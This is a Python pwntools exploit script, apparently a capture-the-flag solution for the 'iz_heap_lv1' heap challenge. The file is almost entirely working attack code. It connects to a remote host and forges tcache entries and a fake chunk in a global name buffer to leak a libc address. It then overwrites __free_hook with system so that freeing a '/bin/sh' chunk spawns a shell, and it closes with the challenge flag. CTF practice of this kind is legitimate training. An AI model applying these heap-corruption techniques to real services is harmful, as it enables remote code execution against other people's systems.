from pwn import *


binpath = './iz_heap_lv1'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
pwn
b *0x00400dfa
ignore 1 14

set $table=0x602060
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
# io = remote('localhost', 4088)
io = remote('165.22.110.249', 3333)


def debug(func):
    def wrapper(*args, **kwargs):
        print "{}({}, {})".format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(size, data):
    io.recvuntil('Choice:')
    io.sendline('1')

    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('data:')
    io.send((data + '\n')[:size])


@debug
def edit(index, size, data):
    io.recvuntil('Choice:')
    io.sendline('2')

    io.recvuntil('index: ')
    io.sendline(str(index))
    io.recvuntil('size: ')
    io.sendline(str(size))
    io.recvuntil('data: ')
    io.send((data + '\n')[:size])

    io.recvuntil('Success!\n')


@debug
def delete(index):
    io.recvuntil('Choice:')
    io.sendline('3')

    io.recvuntil('index: ')
    io.sendline(str(index))


@debug
def show_name(new_name=''):
    io.recvuntil('Choice:')
    io.sendline('4')
    io.recvuntil('/N')
    if new_name:
        io.sendline('Y'.ljust(7, '\x00'))
        io.sendline(new_name)
    else:
        io.sendline('N'.ljust(7, '\x00'))

    io.recvuntil('Name: ')
    data = io.recvuntil('1.')[:-2]
    return data


addr_array = 0x602060
addr_name = 0x602100
addr_tcache = addr_name + 0x10

tcache =  ''
# tcache += p64(0)
tcache += p64(0x201)
payload = p64(addr_tcache) + tcache

io.recvuntil('name: ')
io.sendline(payload)

for i in xrange(7):
    add(0x88, str(i))

for i in xrange(7):
    delete(i)

fake_chunk =  ''
fake_chunk += p64(0x70) # prev_size
fake_chunk += p64(0x91) # size
fake_chunk += '\x00' * 0x88

fake_chunk += p64(0x31) # size
fake_chunk += '\x00' * 0x28

fake_chunk += p64(0x31) # size

payload = fake_chunk
edit(20, 0x1f8, payload)

addr_fake_chunk = 0x602120
show_name(p64(addr_fake_chunk))
delete(20)

pad = 'A' * (0x8 * 4 - 1)
data = show_name(pad)
addr_libc = u64(data[data.find('\n')+1:].rstrip().ljust(8, '\x00')) - 0x3ebca0
print 'addr_libc = {}'.format(hex(addr_libc))


tcache = ''
tcache += p64(0x30)
payload = p64(addr_tcache) + tcache
# place fake_tcache at name
show_name(payload)

# tcache[0x30]->(fake_tcache)
delete(20)

tcache = ''
tcache += p64(0x30)
tcache += p64(addr_libc + libc.symbols['__free_hook']) # next
payload = p64(addr_tcache) + tcache
# tcache[0x30]->(fake_tcache)->(__malloc_hook)
show_name(payload)

add(0x28, '/bin/sh\x00') # consume
add(0x28, p64(addr_libc + libc.symbols['system']))
delete(0)

io.interactive()


# ISITDTU{d800dab9684113a5d6c7d2c0381b48c1553068bc}
